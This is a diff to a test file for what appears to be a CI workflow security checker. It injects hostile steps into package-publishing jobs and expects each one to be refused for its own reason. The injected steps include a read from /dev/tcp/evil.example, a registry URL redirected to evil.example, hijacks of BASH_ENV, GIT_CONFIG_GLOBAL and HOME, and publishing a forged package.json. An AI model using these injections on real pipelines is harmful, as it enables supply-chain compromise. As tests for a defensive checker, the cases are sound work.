@@ -442,116 +442,142 @@ describe("git's configuration isolation sits on the git steps (round 5)", () => 
   });
 });
 
-describe("the reviewers' round-4 driver cases, against the real workflows", () => {
+describe("the reviewers' round-4 driver cases, each refused for its own reason", () => {
+  // Injected into a job whose command table allows the command, so the row
+  // fails on its own rule, never on "not a command this job runs" (round 6).
   const s = (job, step) => (w) => inject(w, P, job, { name: "injected", ...step });
+  const PRINTF = /printf takes no option/;
+  const INPUT = /reads input only from publish-tmp\/ or a path this job downloads to/;
+  const OPX = /an operator expansion \(\$\{NAME…\}\) is allowed only in a recorded exception/;
   it.each([
-    ["P1 printf '-v' X y", "publish-crates", s("publish-crates", { run: "printf '-v' X y" })],
-    ["P2 printf '-vHOME' x", "publish-crates", s("publish-crates", { run: "printf '-vHOME' x" })],
-    ['P3 printf "-v" X y', "publish-crates", s("publish-crates", { run: 'printf "-v" X y' })],
-    ["P3b printf -v'' X y", "publish-crates", s("publish-crates", { run: "printf -v'' X y" })],
+    ["P1 printf '-v' X y", s("publish-maven", { run: "printf '-v' X y" }), PRINTF],
+    ["P2 printf '-vHOME' x", s("publish-maven", { run: "printf '-vHOME' x" }), PRINTF],
+    ['P3 printf "-v" X y', s("publish-maven", { run: 'printf "-v" X y' }), PRINTF],
+    ["P3b printf -v'' X y", s("publish-maven", { run: "printf -v'' X y" }), PRINTF],
     [
       "M1 job env NPM_VERSION npm:evil",
-      "publish-npm",
       (w) => {
         w[P].jobs["publish-npm"].env.NPM_VERSION = "npm:evil@1.0.0";
       },
+      /env NPM_VERSION redefines the workflow's NPM_VERSION/,
     ],
     [
       "M2 step env RUST_VERSION",
-      "publish-crates",
       s("publish-crates", { run: "echo x", env: { RUST_VERSION: "nightly" } }),
+      /env RUST_VERSION redefines the workflow's RUST_VERSION/,
     ],
     [
       "M3 step env TAG",
-      "publish-crates",
       s("publish-crates", { run: "echo x", env: { TAG: "evil" } }),
+      /TAG is evil, not its pinned expression/,
     ],
     [
       "M4 job env MAVEN_URL",
-      "publish-maven",
       (w) => {
         w[P].jobs["publish-maven"].env = {
           ...(w[P].jobs["publish-maven"].env ?? {}),
           MAVEN_URL: "https://evil.example",
         };
       },
+      /env MAVEN_URL redefines the workflow's MAVEN_URL/,
     ],
-    [
-      "L1 sort < /dev/tcp",
-      "publish-crates",
-      s("publish-crates", { run: "sort < /dev/tcp/evil.example/80" }),
-    ],
+    ["L1 sort < /dev/tcp", s("publish-maven", { run: "sort < /dev/tcp/evil.example/80" }), INPUT],
     [
       "N3 GIT_CONFIG_GLOBAL=publish-tmp/gc",
-      "publish-crates",
-      s("publish-crates", { run: "echo x", env: { GIT_CONFIG_GLOBAL: "publish-tmp/gc" } }),
+      s("publish-maven", { run: "echo x", env: { GIT_CONFIG_GLOBAL: "publish-tmp/gc" } }),
+      /sets GIT_CONFIG_GLOBAL, which points every tool at another configuration/,
     ],
     [
       "N3c GIT_CONFIG_COUNT",
-      "publish-crates",
-      s("publish-crates", { run: "echo x", env: { GIT_CONFIG_COUNT: "1" } }),
+      s("publish-maven", { run: "echo x", env: { GIT_CONFIG_COUNT: "1" } }),
+      /sets GIT_CONFIG_COUNT, which CREDENTIALED_ENV does not allow/,
     ],
     [
       "N3d workflow env BASH_ENV",
-      "publish-",
       (w) => {
         w[P].env.BASH_ENV = "publish-tmp/rc";
       },
+      /sets BASH_ENV, which CREDENTIALED_ENV does not allow/,
     ],
     [
       "N3e workflow env GIT_CONFIG_GLOBAL",
-      "publish-",
       (w) => {
         w[P].env.GIT_CONFIG_GLOBAL = "publish-tmp/gc";
       },
+      /GIT_CONFIG_GLOBAL is set in the workflow's env|sets GIT_CONFIG_GLOBAL, which points/,
     ],
     [
       "N3f workflow env CURL_HOME",
-      "publish-",
       (w) => {
         w[P].env.CURL_HOME = "publish-tmp";
       },
+      /sets CURL_HOME, which CREDENTIALED_ENV does not allow/,
     ],
     [
       "N3g step env HOME",
-      "publish-crates",
-      s("publish-crates", { run: "echo x", env: { HOME: "/dev/null" } }),
+      s("publish-maven", { run: "echo x", env: { HOME: "/dev/null" } }),
+      /sets HOME, which points every tool at another configuration/,
     ],
     [
       'N4 sort < "${TAG:-/dev/tcp/h/80}"',
-      "publish-crates",
-      s("publish-crates", { run: 'sort < "${TAG:-/dev/tcp/h/80}"' }),
+      s("publish-maven", { run: 'sort < "${TAG:-/dev/tcp/h/80}"' }),
+      /a redirection target must be a literal path/,
     ],
     [
       "N4b curl with an operator expansion",
-      "publish-go",
       s("publish-go", { run: 'curl -fsS --proto =https "https://proxy.golang.org/${TAG:-x}"' }),
+      OPX,
     ],
-    ['N4c echo "${TAG:-x}"', "publish-crates", s("publish-crates", { run: 'echo "${TAG:-x}"' })],
-    ["N5 sort < release/x", "publish-crates", s("publish-crates", { run: "sort < release/x" })],
-    ["N5b sort < dist/x", "publish-crates", s("publish-crates", { run: "sort < dist/x" })],
+    ['N4c echo "${TAG:-x}"', s("publish-maven", { run: 'echo "${TAG:-x}"' }), OPX],
     [
-      "N6 a forged package.json published from publish-tmp",
-      "publish-npm",
+      "N5 sha256sum < release/x where the job downloads to dist/",
+      (w) =>
+        inject(w, C, "upload", { name: "injected", run: "sha256sum --check --strict < release/x" }),
+      INPUT,
+    ],
+    [
+      "N5b sort < dist/x where the job downloads to release/",
+      s("publish-maven", { run: "sort < dist/x" }),
+      INPUT,
+    ],
+    [
+      "N6 npm publishing a forged package.json from publish-tmp",
       s("publish-npm", {
-        run: 'mkdir -p publish-tmp/p\nprintf \'%s\\n\' \'{"name":"x","version":"9.9.9"}\' > publish-tmp/p/package.json\nnpm publish --access public --provenance --ignore-scripts ./publish-tmp/p',
+        run: "npm publish --access public --provenance --ignore-scripts ./publish-tmp/p",
       }),
+      /npm publish uploads only \.\/release\/\$\{ARTIFACT\}/,
     ],
     [
       "N7 git push from the npm job",
-      "publish-npm",
       s("publish-npm", { run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x" }),
+      /git is not a command environment sdk-publish-npm's job runs/,
     ],
-    ["N8 a quoted 'if'", "publish-crates", s("publish-crates", { run: "'if' echo x" })],
+    [
+      "N8 a quoted 'if'",
+      s("publish-maven", { run: "'if' echo x" }),
+      /if is not a command a credentialed job runs/,
+    ],
     [
       "N9 a comment that assigns",
-      "pack-crates",
       s("pack-crates", { run: '# FOO=\necho "${FOO}"' }),
+      /reads \$FOO, which no env:/,
     ],
-  ])("refuses %s", (_, job, mutate) => {
+    [
+      "gem pushing another file",
+      s("publish-rubygems", { run: 'gem push "./release/x.gem"' }),
+      /gem push uploads only/,
+    ],
+    [
+      "dotnet pushing another file",
+      s("publish-nuget", {
+        run: 'dotnet nuget push "./release/x.nupkg" --source https://api.nuget.org/v3/index.json',
+      }),
+      /dotnet nuget push uploads only/,
+    ],
+  ])("refuses %s", (_, mutate, why) => {
     const got = added(mutate);
     expect(
-      got.some((g) => g.includes(`: ${job}`)),
+      got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
     ).toBe(true);
   });
